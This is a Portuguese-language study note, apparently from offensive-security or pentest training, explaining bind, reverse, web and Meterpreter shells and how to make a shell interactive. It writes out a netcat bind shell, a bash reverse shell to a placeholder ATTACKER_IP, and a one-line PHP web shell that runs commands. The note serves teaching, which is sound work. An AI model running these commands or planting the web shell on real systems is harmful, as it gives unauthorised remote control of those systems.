# Shells Overview 🐚

## 📌 O que são Shells?
- Shells são interfaces que permitem **interação direta com o sistema**.
- Podem ser locais (quando já temos acesso direto ao terminal) ou remotos (quando conquistamos acesso via exploração).
- No contexto de segurança ofensiva, são cruciais para **ganhar persistência e controle** após comprometer um alvo.

---

## 🛠 Tipos de Shells

### 1. **Bind Shell**
- O alvo **abre uma porta** e fica "escutando".
- O atacante conecta-se a essa porta para obter acesso.
- Características:
  - Mais simples de configurar no alvo.
  - Porém, pode ser bloqueado por firewalls.
- Exemplo:
  - No alvo: `nc -lvnp 4444 -e /bin/bash`
  - No atacante: `nc <IP_vítima> 4444`

### 2. **Reverse Shell**
- O alvo **se conecta de volta** ao atacante.
- O atacante fica "escutando" e recebe a shell.
- Mais comum em pentests, pois **contorna firewalls** que bloqueiam conexões externas.
- Exemplo:
  - No atacante: `nc -lvnp 4444`
  - No alvo: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`

### 3. **Web Shell**
- Script enviado para um servidor vulnerável que permite execução de comandos.
- Geralmente escrito em **PHP, ASP, JSP ou outras linguagens de servidor**.
- Exemplo (PHP simples):
  ```php
  <?php system($_GET['cmd']); ?>
- Útil em casos de upload de arquivos mal configurados.

### 4. Meterpreter Shell

Shell avançada fornecida pelo Metasploit.
Funcionalidades:
- **Execução de comandos em memória (sem escrever em disco).**
- **Captura de screenshots, keylogging, pivoting.**
- **Upload/Download de arquivos.**
- **Módulos de pós-exploração.**

### De Shells Simples para Interativas

Muitas vezes, a shell inicial obtida é não interativa (sem autocomplete, sem histórico, sem atalhos).
Para transformá-la em algo mais utilizável:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
# 2. Ajustando terminal

- No shell remoto: `export TERM=xterm`
- No atacante: `stty raw -echo; fg`

# 3. Usando rlwrap
```bash
rlwrap nc -lvnp 4444
- Permite histórico e edição de comandos.
```

📚 Resumo

- **Bind Shell**: alvo abre a porta, atacante conecta.
- **Reverse Shell**: alvo conecta de volta no atacante (mais usado).
- **Web Shell**: script enviado para execução remota.
- **Meterpreter**: shell avançada do Metasploit.
- **Upgrade de shells**: técnicas para torná-las interativas.
